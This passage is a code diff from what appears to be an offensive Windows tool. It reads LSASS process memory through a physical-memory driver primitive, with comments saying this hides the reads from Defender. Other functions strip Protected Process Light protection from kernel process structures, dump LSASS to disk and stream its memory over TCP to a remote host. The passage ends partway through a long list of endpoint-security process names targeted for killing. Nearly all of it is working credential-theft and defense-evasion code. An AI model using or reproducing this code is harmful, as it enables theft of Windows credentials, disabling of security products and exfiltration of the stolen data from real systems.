-// Returns 0 if VA is not mapped.
+// ---------------------------------------------------------------------------
+// CR3-based physical process memory access (for --dump-kernel)
+// ---------------------------------------------------------------------------
 static QWORD Cr3VaToPa(QWORD cr3, QWORD va) {
     QWORD pml4_idx = (va >> 39) & 0x1FF;
     QWORD pdpt_idx = (va >> 30) & 0x1FF;
@@ -719,29 +797,19 @@ static QWORD Cr3VaToPa(QWORD cr3, QWORD va) {
     QWORD pt_idx   = (va >> 12) & 0x1FF;
     QWORD offset   = va & 0xFFF;
 
-    QWORD pml4e = PhysReadQword((cr3 & ~0xFFFULL) + pml4_idx * 8);
+    QWORD pml4e = 0; BiosTool_ReadPhys((PVOID)((cr3 & ~0xFFFULL) + pml4_idx * 8), 8, &pml4e);
     if (!(pml4e & 1)) return 0;
-    QWORD pdpt_pa = pml4e & 0x000FFFFFFFFFF000ULL;
-
-    QWORD pdpte = PhysReadQword(pdpt_pa + pdpt_idx * 8);
+    QWORD pdpte = 0; BiosTool_ReadPhys((PVOID)((pml4e & ~0xFFFULL) + pdpt_idx * 8), 8, &pdpte);
     if (!(pdpte & 1)) return 0;
-    if (pdpte & (1ULL << 7)) // 1GB page
-        return (pdpte & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFFULL);
-    QWORD pd_pa = pdpte & 0x000FFFFFFFFFF000ULL;
-
-    QWORD pde = PhysReadQword(pd_pa + pd_idx * 8);
+    if (pdpte & (1ULL << 7)) return (pdpte & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFFULL);
+    QWORD pde = 0; BiosTool_ReadPhys((PVOID)((pdpte & ~0xFFFULL) + pd_idx * 8), 8, &pde);
     if (!(pde & 1)) return 0;
-    if (pde & (1ULL << 7)) // 2MB large page
-        return (pde & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFFULL);
-    QWORD pt_pa = pde & 0x000FFFFFFFFFF000ULL;
-
-    QWORD pte = PhysReadQword(pt_pa + pt_idx * 8);
+    if (pde & (1ULL << 7)) return (pde & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFFULL);
+    QWORD pte = 0; BiosTool_ReadPhys((PVOID)((pde & ~0xFFFULL) + pt_idx * 8), 8, &pte);
     if (!(pte & 1)) return 0;
     return (pte & 0x000FFFFFFFFFF000ULL) | offset;
 }
 
-// Read bytes from a foreign process's virtual address using CR3 page walk.
-// No OpenProcess or handle needed -- completely invisible to Defender callbacks.
 static bool PhysReadProcessMemory(QWORD cr3, QWORD va, PVOID buf, SIZE_T size) {
     auto pOut = (PUCHAR)buf;
     while (size > 0) {
@@ -749,7 +817,7 @@ static bool PhysReadProcessMemory(QWORD cr3, QWORD va, PVOID buf, SIZE_T size) {
         QWORD chunk   = std::min(size, (SIZE_T)(0x1000 - pageOff));
         QWORD pa = Cr3VaToPa(cr3, va);
         if (!pa) {
-            memset(pOut, 0, chunk);  // unmapped - zero fill
+            memset(pOut, 0, chunk);
         } else {
             if (!BiosTool_ReadPhys((PVOID)pa, chunk, pOut)) return false;
         }
@@ -760,94 +828,12 @@ static bool PhysReadProcessMemory(QWORD cr3, QWORD va, PVOID buf, SIZE_T size) {
     return true;
 }
 
-// Scan LSASS memory for the WDigest credential cache signature and dump
-// a small region around each match. No OpenProcess required.
-// Format: "WDIG_CRED\0" marker + 128-byte region for each hit
-static bool ScanLsassWDigest(QWORD lsassEproc, QWORD cr3, const char* outPath) {
-    // DirectoryTableBase is at KPROCESS offset 0x28 (stable, first field of KPROCESS)
-    // But we already have cr3 passed in.
-
-    // Scan LSASS user-mode address range [0x10000 .. 0x7FFF_FFFF_FFFF]
-    // Look for WDigest signature patterns: wchar "NTLM\0" or "lsasrv\0"
-    printf("[*] Scanning LSASS process memory via CR3 0x%llX...\n", cr3);
-
-    // Enumerate LSASS regions via NtQueryVirtualMemory (needs PROCESS_QUERY_INFORMATION)
-    typedef NTSTATUS(NTAPI* NtQVM_t)(HANDLE, PVOID, ULONG, PVOID, SIZE_T, PSIZE_T);
-    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-    auto NtQVM = (NtQVM_t)GetProcAddress(ntdll, "NtQueryVirtualMemory");
-    if (!NtQVM) { printf("[-] NtQueryVirtualMemory not found\n"); return false; }
-
-    // Open with minimal rights - PROCESS_QUERY_INFORMATION only
-    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_QUERY_LIMITED_INFORMATION,
-                               FALSE, (DWORD)KReadQword(lsassEproc + g_off.UniqueProcessId));
-    if (!hProc) {
-        printf("[-] OpenProcess(QUERY_INFO) failed (%lu), trying limited...\n", GetLastError());
-        hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE,
-                            (DWORD)KReadQword(lsassEproc + g_off.UniqueProcessId));
-    }
-    if (!hProc) { printf("[-] Cannot open LSASS even with query-only access (%lu)\n", GetLastError()); return false; }
-    printf("[+] LSASS handle (query-only): 0x%p\n", hProc);
-
-    HANDLE hOut = CreateFileA(outPath, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
-    if (hOut == INVALID_HANDLE_VALUE) { CloseHandle(hProc); return false; }
-
-    struct { char magic[8]; QWORD va; QWORD size; } regionHdr;
-    memcpy(regionHdr.magic, "CASCRAW\0", 8);
-
-    // Needle: UTF-16 "NTLM" appears in WDigest credential blocks
-    const BYTE needle[] = { 'N',0,'T',0,'L',0,'M',0 };
-
-    QWORD addr = 0x10000;
-    MEMORY_BASIC_INFORMATION mbi{};
-    SIZE_T retLen = 0;
-    int regions = 0, hits = 0;
-
-    while (addr < 0x7FFFFFFFFFFF00ULL) {
-        NTSTATUS st = NtQVM(hProc, (PVOID)addr, 0 /*MemoryBasicInformation*/,
-                            &mbi, sizeof(mbi), &retLen);
-        if (!NT_SUCCESS(st)) break;
-        if (mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE &&
-            (mbi.Protect & (PAGE_READWRITE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE))) {
-            // Read this region via physical (bypasses Defender VM_READ interception)
-            SIZE_T rsz = mbi.RegionSize;
-            if (rsz > 16ULL * 1024 * 1024) rsz = 16ULL * 1024 * 1024; // cap 16MB
-            std::vector<BYTE> rbuf(rsz, 0);
-            if (PhysReadProcessMemory(cr3, (QWORD)mbi.BaseAddress, rbuf.data(), rsz)) {
-                // Write region header + data
-                regionHdr.va = (QWORD)mbi.BaseAddress;
-                regionHdr.size = rsz;
-                DWORD w = 0;
-                WriteFile(hOut, &regionHdr, sizeof(regionHdr), &w, nullptr);
-                WriteFile(hOut, rbuf.data(), (DWORD)rsz, &w, nullptr);
-                regions++;
-
-                // Scan for NTLM needle
-                for (SIZE_T i = 0; i + sizeof(needle) < rsz; i++) {
-                    if (memcmp(&rbuf[i], needle, sizeof(needle)) == 0) {
-                        hits++;
-                        printf("[+] NTLM marker at LSASS VA 0x%llX (file offset +%zu)\n",
-                               (QWORD)mbi.BaseAddress + i, i);
-                        if (hits > 32) goto done;
-                    }
-                }
-            }
-        }
-        addr = (QWORD)mbi.BaseAddress + mbi.RegionSize;
-    }
-done:
-    CloseHandle(hProc);
-    CloseHandle(hOut);
-    printf("[+] Kernel-direct dump: %d regions captured, %d NTLM markers found -> %s\n",
-           regions, hits, outPath);
-    return true;
-}
-
 // ---------------------------------------------------------------------------
-// PPL strip
+// PPL operations
 // ---------------------------------------------------------------------------
 struct PplResult { bool ok; QWORD eproc; BYTE before; char name[16]; };
 
-static PplResult StripPpl(QWORD sysEproc, DWORD pid, bool dryRun) {
+static PplResult StripPpl(QWORD sysEproc, DWORD pid, bool dryRun, bool clearSigLevel = false) {
     PplResult r{};
     r.eproc = FindEprocessByPid(sysEproc, pid, r.name);
     if (!r.eproc) { printf("[-] PID %lu not found\n", pid); return r; }
@@ -855,8 +841,6 @@ static PplResult StripPpl(QWORD sysEproc, DWORD pid, bool dryRun) {
 
     ScanAndFixOffsets(r.eproc, pid);
 
-    // Read code-integrity bytes (informational only - do NOT zero SignatureLevel/SectionSignatureLevel
-    // as that triggers CRITICAL_PROCESS_DIED on live LSASS; use --patch-callbacks instead)
     BYTE sigLevel = 0, secSigLevel = 0;
     KRead(r.eproc + g_off.Protection - 2, &sigLevel,    1);
     KRead(r.eproc + g_off.Protection - 1, &secSigLevel, 1);
@@ -865,8 +849,13 @@ static PplResult StripPpl(QWORD sysEproc, DWORD pid, bool dryRun) {
            sigLevel, secSigLevel, r.before);
 
     if (dryRun) { printf("[dry-run] Skipping write\n"); r.ok = true; return r; }
+    if (r.before == 0 && !clearSigLevel) { printf("[!] Protection already 0x00\n"); r.ok = true; return r; }
 
-    if (r.before == 0) { printf("[!] Protection already 0x00\n"); r.ok = true; return r; }
+    if (clearSigLevel) {
+        BYTE zero = 0;
+        KWrite(r.eproc + g_off.Protection - 2, &zero, 1);
+        KWrite(r.eproc + g_off.Protection - 1, &zero, 1);
+    }
 
     BYTE zero = 0;
     if (!KWrite(r.eproc + g_off.Protection, &zero, 1)) {
@@ -880,8 +869,38 @@ static PplResult StripPpl(QWORD sysEproc, DWORD pid, bool dryRun) {
     return r;
 }
 
+// Restore all three protection bytes (used after MiniDumpWriteDump).
+static void RestorePpl(QWORD eproc, BYTE protection, BYTE sigLevel, BYTE secSigLevel) {
+    KWrite(eproc + g_off.Protection - 2, &sigLevel,    1);
+    KWrite(eproc + g_off.Protection - 1, &secSigLevel, 1);
+    KWrite(eproc + g_off.Protection,     &protection,  1);
+    BYTE check = 0;
+    KRead(eproc + g_off.Protection, &check, 1);
+    printf("[*] Protection restored: 0x%02X (verify: 0x%02X)\n", protection, check);
+}
+
+// Set PPL: type=Protected(2), signer=WinSystem(6) -> Protection byte = 0x62
+static bool PplAdd(QWORD sysEproc, DWORD pid) {
+    char nm[16]{};
+    QWORD ep = FindEprocessByPid(sysEproc, pid, nm);
+    if (!ep) { printf("[-] PID %lu not found\n", pid); return false; }
+    printf("[+] Target EPROCESS: 0x%llX (%s)\n", ep, nm);
+
+    BYTE cur = 0; KRead(ep + g_off.Protection, &cur, 1);
+    printf("[*] Current Protection: 0x%02X\n", cur);
+
+    // PS_PROTECTION: Level = (Signer<<4) | (Type) = (6<<4) | 2 = 0x62
+    BYTE ppl = 0x62;
+    if (!KWrite(ep + g_off.Protection, &ppl, 1)) {
+        printf("[-] KWrite Protection failed\n"); return false;
+    }
+    BYTE check = 0; KRead(ep + g_off.Protection, &check, 1);
+    printf("[+] Protection set to 0x%02X (verify: 0x%02X) - PsProtectedTypeProtected/WinSystem\n", ppl, check);
+    return (check == ppl);
+}
+
 // ---------------------------------------------------------------------------
-// LSASS dump (from warp.cpp)
+// Process finder
 // ---------------------------------------------------------------------------
 static DWORD FindPidByName(const char* name) {
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -897,39 +916,10 @@ static DWORD FindPidByName(const char* name) {
     return pid;
 }
 
-static std::atomic<unsigned long long> g_dumpBytes(0);
-static LPVOID g_dumpBuf = nullptr;
-static QWORD  g_dumpBufSz = 0;
-
-static BOOL CALLBACK DumpCb(PVOID, MINIDUMP_CALLBACK_INPUT* in, MINIDUMP_CALLBACK_OUTPUT* out) {
-    switch (in->CallbackType) {
-    case IoStartCallback:  out->Status = S_FALSE; return TRUE;
-    case IoWriteAllCallback: {
-        // MINIDUMP_CALLBACK_INPUT layout (x64):
-        //   +0x00: ProcessId (ULONG, 4)
-        //   +0x04: ProcessHandle (HANDLE, 8)
-        //   +0x0C: CallbackType (ULONG, 4)
-        //   +0x10: union { Io ... }  ← union starts here at 16
-        // MINIDUMP_IO_CALLBACK:
-        //   +0x00: FileHandle (HANDLE, 8)
-        //   +0x08: Offset (ULONG64, 8)
-        //   +0x10: Buffer (PVOID, 8)
-        //   +0x18: BufferBytes (ULONG, 4)
-        BYTE* u = (BYTE*)in + sizeof(ULONG) + sizeof(HANDLE) + sizeof(ULONG);  // = 16
-        UINT64 offset = *(UINT64*)(u + 8);
-        LPVOID buffer = *(LPVOID*)(u + 16);
-        ULONG  bytes  = *(ULONG*)(u + 24);
-        if (offset + bytes > g_dumpBufSz) { out->Status = E_OUTOFMEMORY; return TRUE; }
-        memcpy((BYTE*)g_dumpBuf + offset, buffer, bytes);
-        g_dumpBytes.fetch_add(bytes);
-        out->Status = S_OK; return TRUE;
-    }
-    case IoFinishCallback: out->Status = S_OK; return TRUE;
-    }
-    return TRUE;
-}
-
-static bool DumpLsass(DWORD pid, const char* outPath, bool noXor) {
+// ---------------------------------------------------------------------------
+// LSASS dump - MiniDumpWriteDump path (deprecated: use --dump-rpm instead)
+// ---------------------------------------------------------------------------
+static bool DumpLsass(DWORD pid, const char* outPath, bool /*noXor*/) {
     EnablePrivilege("SeDebugPrivilege");
 
     typedef NTSTATUS(WINAPI* NtSP_t)(HANDLE);
@@ -939,23 +929,7 @@ static bool DumpLsass(DWORD pid, const char* outPath, bool noXor) {
     HANDLE hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (!hTarget) { printf("[-] OpenProcess %lu failed (%lu)\n", pid, GetLastError()); return false; }
 
-    // Quick ReadProcessMemory test to verify handle access before suspending
-    {
-        MEMORY_BASIC_INFORMATION mbi{};
-        SIZE_T bytesRead = 0;
-        BYTE testBuf[16]{};
-        if (VirtualQueryEx(hTarget, (LPCVOID)0x10000, &mbi, sizeof(mbi))) {
-            ReadProcessMemory(hTarget, mbi.BaseAddress, testBuf, 16, &bytesRead);
-        }
-        printf("[*] RPM test: bytesRead=%zu (handle %s)\n", bytesRead,
-               bytesRead > 0 ? "OK" : "BLOCKED/EMPTY");
-    }
-
-    // Suspend via process handle (uses PROCESS_SUSPEND_RESUME, not per-thread THREAD_SUSPEND_RESUME)
-    if (NtSP) {
-        NTSTATUS st = NtSP(hTarget);
-        printf("[*] NtSuspendProcess: 0x%lX\n", (ULONG)st);
-    }
+    if (NtSP) { NTSTATUS st = NtSP(hTarget); printf("[*] NtSuspendProcess: 0x%lX\n", (ULONG)st); }
 
     HANDLE hOut = CreateFileA(outPath, GENERIC_WRITE, FILE_SHARE_READ, nullptr,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
@@ -966,34 +940,33 @@ static bool DumpLsass(DWORD pid, const char* outPath, bool noXor) {
         return false;
     }
 
-    printf("[*] MiniDumpWriteDump PID=%lu (type=0x200 PrivateReadWrite)...\n", pid);
-    BOOL ok = MiniDumpWriteDump(hTarget, pid, hOut, (MINIDUMP_TYPE)0x200,
-                                nullptr, nullptr, nullptr);
+    MINIDUMP_TYPE dumpType = (MINIDUMP_TYPE)(
+        MiniDumpWithFullMemory | MiniDumpWithHandleData |
+        MiniDumpWithUnloadedModules | MiniDumpWithFullMemoryInfo |
+        MiniDumpWithThreadInfo | MiniDumpWithTokenInformation);
+
+    printf("[*] MiniDumpWriteDump PID=%lu...\n", pid);
+    BOOL ok = MiniDumpWriteDump(hTarget, pid, hOut, dumpType, nullptr, nullptr, nullptr);
     DWORD err = GetLastError();
 
     FlushFileBuffers(hOut);
     CloseHandle(hOut);
-
     if (NtRP) NtRP(hTarget);
     CloseHandle(hTarget);
 
-    if (!ok) {
-        printf("[-] MiniDumpWriteDump failed, GLE=%lu\n", err);
-        return false;
-    }
+    if (!ok) { printf("[-] MiniDumpWriteDump failed, GLE=%lu\n", err); return false; }
 
     LARGE_INTEGER sz{};
-    HANDLE hCheck = CreateFileA(outPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
+    HANDLE hCheck = CreateFileA(outPath, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
                                 nullptr, OPEN_EXISTING, 0, nullptr);
-    if (hCheck != INVALID_HANDLE_VALUE) {
-        GetFileSizeEx(hCheck, &sz);
-        CloseHandle(hCheck);
-    }
+    if (hCheck != INVALID_HANDLE_VALUE) { GetFileSizeEx(hCheck, &sz); CloseHandle(hCheck); }
     printf("[!!!] Dump written to %s (%lld bytes)\n", outPath, sz.QuadPart);
     return sz.QuadPart > 0;
 }
 
-// Direct ReadProcessMemory scan - no thread suspension required
+// ---------------------------------------------------------------------------
+// LSASS dump - ReadProcessMemory path
+// ---------------------------------------------------------------------------
 static bool DumpRpm(DWORD pid, const char* outPath) {
     EnablePrivilege("SeDebugPrivilege");
     HANDLE hTarget = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
@@ -1013,7 +986,6 @@ static bool DumpRpm(DWORD pid, const char* outPath) {
             std::vector<BYTE> buf(mbi.RegionSize);
             SIZE_T bytesRead = 0;
             if (ReadProcessMemory(hTarget, mbi.BaseAddress, buf.data(), mbi.RegionSize, &bytesRead) && bytesRead > 0) {
-                // Write record: [addr 8B][size 8B][data N]
                 QWORD base = (QWORD)mbi.BaseAddress;
                 QWORD sz   = bytesRead;
                 fwrite(&base, 8, 1, fOut);
@@ -1034,57 +1006,389 @@ static bool DumpRpm(DWORD pid, const char* outPath) {
 }
 
 // ---------------------------------------------------------------------------
-// EDR kill (simplified from UsingBYOVD DriverLoader.cpp KillAllAvOrEdr)
+// LSASS dump - TCP streaming (disk-free)
+// ---------------------------------------------------------------------------
+static bool DumpRpmTcp(DWORD pid, const char* recvIp, int recvPort) {
+    EnablePrivilege("SeDebugPrivilege");
+    HANDLE hTarget = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
+    if (!hTarget) { printf("[-] OpenProcess PROCESS_VM_READ failed (%lu)\n", GetLastError()); return false; }
+
+    WSADATA wsa{};
+    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
+        printf("[-] WSAStartup failed\n"); CloseHandle(hTarget); return false;
+    }
+
+    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sock == INVALID_SOCKET) {
+        printf("[-] socket() failed\n"); WSACleanup(); CloseHandle(hTarget); return false;
+    }
+
+    struct sockaddr_in sa{};
+    sa.sin_family = AF_INET;
+    sa.sin_port   = htons((u_short)recvPort);
+    inet_pton(AF_INET, recvIp, &sa.sin_addr);
+
+    printf("[*] Connecting to %s:%d...\n", recvIp, recvPort);
+    if (connect(sock, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
+        printf("[-] connect() failed (%d)\n", WSAGetLastError());
+        closesocket(sock); WSACleanup(); CloseHandle(hTarget); return false;
+    }
+    printf("[+] Connected. Streaming LSASS memory...\n");
+
+    MEMORY_BASIC_INFORMATION mbi{};
+    BYTE* addr = nullptr;
+    SIZE_T totalBytes = 0, regions = 0;
+
+    auto sendAll = [&](const void* data, int len) -> bool {
+        const char* p = (const char*)data;
+        while (len > 0) {
+            int sent = send(sock, p, len, 0);
+            if (sent <= 0) return false;
+            p += sent; len -= sent;
+        }
+        return true;
+    };
+
+    while (VirtualQueryEx(hTarget, addr, &mbi, sizeof(mbi))) {
+        if (mbi.State == MEM_COMMIT &&
+            (mbi.Protect & PAGE_GUARD) == 0 &&
+            (mbi.Protect & PAGE_NOACCESS) == 0) {
+            std::vector<BYTE> buf(mbi.RegionSize);
+            SIZE_T bytesRead = 0;
+            if (ReadProcessMemory(hTarget, mbi.BaseAddress, buf.data(), mbi.RegionSize, &bytesRead) && bytesRead > 0) {
+                QWORD base = (QWORD)mbi.BaseAddress;
+                QWORD sz   = bytesRead;
+                if (!sendAll(&base, 8) || !sendAll(&sz, 8) || !sendAll(buf.data(), (int)bytesRead)) {
+                    printf("[-] send() failed at region 0x%llX\n", base);
+                    break;
+                }
+                totalBytes += bytesRead;
+                regions++;
+            }
+        }
+        addr = (BYTE*)mbi.BaseAddress + mbi.RegionSize;
+        if ((QWORD)addr < (QWORD)mbi.BaseAddress) break;
+    }
+
+    closesocket(sock);
+    WSACleanup();
+    CloseHandle(hTarget);
+    printf("[+] DumpRpmTcp: %zu regions, %zu bytes sent to %s:%d\n", regions, totalBytes, recvIp, recvPort);
+    return totalBytes > 0;
+}
+
+// ---------------------------------------------------------------------------
+// Kernel-direct dump via CR3 page walk
+// ---------------------------------------------------------------------------
+static bool DumpKernel(QWORD sysEproc, DWORD pid, const char* outPath) {
+    char nm[16]{};
+    QWORD lsassEp = FindEprocessByPid(sysEproc, pid, nm);
+    if (!lsassEp) { printf("[-] LSASS EPROCESS not found\n"); return false; }
+
+    QWORD cr3 = KReadQword(lsassEp + 0x28);
+    printf("[*] LSASS EPROCESS: 0x%llX  CR3: 0x%llX\n", lsassEp, cr3);
+    if (!cr3) { printf("[-] CR3 read returned 0\n"); return false; }
+
+    // Try to find user-mode CR3 (KPTI shadow PML4)
+    static const DWORD ucrOffsets[] = { 0x388, 0x280, 0x3B8, 0x028 };
+    QWORD useCr3 = cr3;
+    for (DWORD off : ucrOffsets) {
+        QWORD cand = KReadQword(lsassEp + off);
+        if (!cand || cand == cr3) continue;
+        QWORD candBase = cand & ~0xFFFULL;
+        QWORD pml4_0 = 0;
+        if (BiosTool_ReadPhys((PVOID)candBase, 8, &pml4_0) && (pml4_0 & 1)) {
+            printf("[*] UserDirectoryTableBase @ 0x%lX = 0x%llX\n", off, cand);
+            useCr3 = cand;
+            break;
+        }
+    }
+    if (useCr3 == cr3)
+        printf("[!] Using kernel CR3 - user-mode pages may not all translate\n");
+
+    // Need a query handle to enumerate regions
+    typedef NTSTATUS(NTAPI* NtQVM_t)(HANDLE, PVOID, ULONG, PVOID, SIZE_T, PSIZE_T);
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    auto NtQVM = (NtQVM_t)GetProcAddress(ntdll, "NtQueryVirtualMemory");
+    if (!NtQVM) { printf("[-] NtQueryVirtualMemory not found\n"); return false; }
+
+    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_QUERY_LIMITED_INFORMATION,
+                               FALSE, pid);
+    if (!hProc) {
+        hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+    }
+    if (!hProc) { printf("[-] Cannot open LSASS for query (%lu)\n", GetLastError()); return false; }
+
+    HANDLE hOut = CreateFileA(outPath, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
+                              FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (hOut == INVALID_HANDLE_VALUE) { CloseHandle(hProc); return false; }
+
+    struct { char magic[8]; QWORD va; QWORD size; } regionHdr;
+    memcpy(regionHdr.magic, "CASCRAW\0", 8);
+
+    QWORD addr = 0x10000;
+    MEMORY_BASIC_INFORMATION mbi{};
+    SIZE_T retLen = 0;
+    int regions = 0, hits = 0;
+    const BYTE needle[] = { 'N',0,'T',0,'L',0,'M',0 };
+
+    while (addr < 0x7FFFFFFFFFFF00ULL) {
+        NTSTATUS st = NtQVM(hProc, (PVOID)addr, 0, &mbi, sizeof(mbi), &retLen);
+        if (!NT_SUCCESS(st)) break;
+        // Include MEM_PRIVATE, MEM_MAPPED, and MEM_IMAGE - all committed readable regions
+        if (mbi.State == MEM_COMMIT &&
+            (mbi.Protect & (PAGE_READWRITE | PAGE_EXECUTE_READ |
+                            PAGE_EXECUTE_READWRITE | PAGE_READONLY)) &&
+            !(mbi.Protect & PAGE_NOACCESS) && !(mbi.Protect & PAGE_GUARD)) {
+            SIZE_T rsz = mbi.RegionSize;
+            if (rsz > 16ULL * 1024 * 1024) rsz = 16ULL * 1024 * 1024;
+            std::vector<BYTE> rbuf(rsz, 0);
+            if (PhysReadProcessMemory(useCr3, (QWORD)mbi.BaseAddress, rbuf.data(), rsz)) {
+                regionHdr.va   = (QWORD)mbi.BaseAddress;
+                regionHdr.size = rsz;
+                DWORD w = 0;
+                WriteFile(hOut, &regionHdr, sizeof(regionHdr), &w, nullptr);
+                WriteFile(hOut, rbuf.data(), (DWORD)rsz, &w, nullptr);
+                regions++;
+                for (SIZE_T i = 0; i + sizeof(needle) < rsz; i++) {
+                    if (memcmp(&rbuf[i], needle, sizeof(needle)) == 0) {
+                        hits++;
+                        printf("[+] NTLM marker at LSASS VA 0x%llX\n",
+                               (QWORD)mbi.BaseAddress + i);
+                        if (hits > 64) goto done;
+                    }
+                }
+            }
+        }
+        addr = (QWORD)mbi.BaseAddress + mbi.RegionSize;
+    }
+done:
+    CloseHandle(hProc);
+    CloseHandle(hOut);
+    printf("[+] Kernel-direct dump: %d regions, %d NTLM markers -> %s\n",
+           regions, hits, outPath);
+    return regions > 0;
+}
+
+// ---------------------------------------------------------------------------
+// EDR kill - full process list (merged from UsingBYOVD)
 // ---------------------------------------------------------------------------
 static const char* kEdrProcs[] = {
-    "MsMpEng.exe","msmpeng.exe","MsSense.exe","WinDefend.exe",
-    "CSFalconService.exe","CSFalconContainer.exe","SentinelAgent.exe","SentinelOne.exe",
-    "cb.exe","CbDefense.exe","xagt.exe","bdagent.exe","ekrn.exe","egui.exe",
-    "avgui.exe","avguard.exe","avp.exe","ksde.exe",
-    "Sysmon.exe","Sysmon64.exe","sysmon.exe",
-    "wazuh-agent.exe","ossec-agent.exe",
-    "elastic-endpoint.exe","elastic-agent.exe",
-    "cyserver.exe","csagent.exe","csfalconservice.exe",
-    "mcshield.exe","mfemactl.exe",
-    "ns.exe","ntrtscan.exe","pccntmon.exe",
-    "SECAgent.exe","cyoptics.exe","CylanceSvc.exe",
+    // Acronis
+    "acronis_agent.exe","BackupAndRecoveryAgent.exe","managementagenthost.exe","mms.exe",
+    // AlienVault
+    "alienvault-agent.exe","osqueryd.exe",
+    // Avast
+    "afwServ.exe","aswEngSrv.exe","aswidsagent.exe","aswToolsSvc.exe",
+    "AvastSvc.exe","AvastUI.exe","bccavsvc.exe","wsc_proxy.exe",
+    // AVG
+    "AVGUI.exe","AVGSvc.exe","avgnt.exe","avgsvca.exe","avgToolsSvc.exe",
+    // Binary Defense
+    "BinaryDefenseAgent.exe",
+    // Bitdefender
+    "Arrakis3.exe","BDAvScanner.exe","BDFsTray.exe","BDFileServer.exe","BDLived2.exe",
+    "BDLogger.exe","BDScheduler.exe","BDStatistics.exe","bdagent.exe","bdemsrv.exe",
+    "bdntwrk.exe","bdredline.exe","bdregsvr2.exe","bdservicehost.exe",
+    // Blumira
+    "BlumiraAgent.exe",
+    // Carbon Black
+    "cb.exe","cbcomms.exe","cbdefense.exe","carbonsensor.exe","RepMgr.exe",
+    // Cisco Talos
+    "cfrutil.exe","cisco_amp_connector.exe","immunet.exe",
+    // CrowdStrike
+    "CSFalconContainer.exe","CSFalconService.exe","CSFalconUI.exe",
+    "csfalcondataprotect.exe","REPRSVC.EXE",
+    // Cynet
+    "CynetEPS.exe","CynetMS.exe","CynetSvc.exe",
+    // Cybereason
+    "ActiveConsole.exe","cybereason.exe","CybereasonActiveProbe.exe","CybereasonCR.exe",
+    // Cylance / BlackBerry
+    "CylanceSvc.exe",
+    // Darktrace
+    "DarktraceTSA.exe",
+    // Deep Instinct
+    "DeepInstinct.exe","DeepInstinctService.exe","DIAgentService.exe",
+    // Elastic
+    "elastic-endpoint.exe","elastic-agent.exe","a2guard.exe","a2service.exe",
+    // ESET
+    "eamonm.exe","eamsi.exe","ecls.exe","efwd.exe","egui.exe","eguiProxy.exe",
+    "ekrn.exe","ekrnEpfw.exe","ERAAgent.exe","EraAgentSvc.exe",
+    // Fortinet
+    "firesvc.exe","firetray.exe","FortiTray.exe","fortiedr.exe",
+    // Heimdal
+    "HeimdalsecurityAgent.exe",
+    // Huntress
+    "HuntressAgent.exe","HuntressRMM.exe",
+    // Kaspersky
+    "avp.exe","avpsus.exe","avpui.exe","kavfs.exe","kavfsscs.exe","kavfswh.exe",
+    "kavfswp.exe","kavtray.exe","klactprx.exe","klcsldcl.exe","klcsweb.exe",
+    "klnagent.exe","klnagchk.exe","klscctl.exe","klserver.exe","klwtblfs.exe",
+    "kpf4ss.exe","ksde.exe","ksdeui.exe","vapm.exe",
+    // McAfee / Trellix
+    "masvc.exe","macmnsvc.exe","McAfeeAgent.exe","mcshield.exe","mfeann.exe",
+    "mfevtps.exe","mfetp.exe","mfeepehost.exe","mfefire.exe","mfemactl.exe",
+    "mfemacsvc.exe","mfemgr.exe","mfemms.exe","MgntSvc.exe","tepfsvc.exe",
+    // Microsoft Defender
+    "MSASCui.exe","MSASCuiL.exe","MpDefenderCoreService.exe","MsMpEng.exe",
+    "MsMpSvc.exe","MsSense.exe","msseces.exe","NisSrv.exe","SecurityHealthService.exe",
+    "SenseCncProxy.exe","SenseIR.exe","SenseNdr.exe","SenseSampleUploader.exe",
+    "smartscreen.exe","windefend.exe","WinDefend.exe",
+    // Morphisec
+    "MorphisecService.exe",
+    // Norton / Symantec
+    "ccApp.exe","ccSvcHst.exe","ns.exe","nsservice.exe","nortonsecurity.exe",
+    "rtvscan.exe","SepMasterService.exe","sepWscSvc64.exe","smc.exe","SmcGui.exe",
+    // OSSEC / Wazuh
+    "ossec-agent.exe","wazuh-agent.exe",
+    // Palo Alto / Cortex
+    "cortexService.exe","trapsagent.exe","trapsd.exe","Traps.exe",
+    // Qualys
+    "qualys-cloud-agent.exe","QualysAgent.exe",
+    // Rapid7
+    "ir_agent.exe","rapid7_endpoint.exe",
+    // Red Canary
+    "RedCanaryAgent.exe",
+    // Sangfor
+    "SangforAgent.exe","SangforEDR.exe","SangforMonitor.exe","SangforProtect.exe","SangforService.exe",
+    // SentinelOne
+    "Sentinel.exe","SentinelAgent.exe","SentinelAgentWorker.exe","SentinelCtl.exe",
+    "SentinelHelperService.exe","SentinelMemoryScanner.exe","SentinelServiceHost.exe",
+    "SentinelStaticEngine.exe","SentinelUI.exe",
+    // SonicWall
+    "SonicWallClientProtectionService.exe","swc_service.exe",
+    // Sophos
+    "hmpalert.exe","McsAgent.exe","McsClient.exe","SavApi.exe","SAVAdminService.exe",
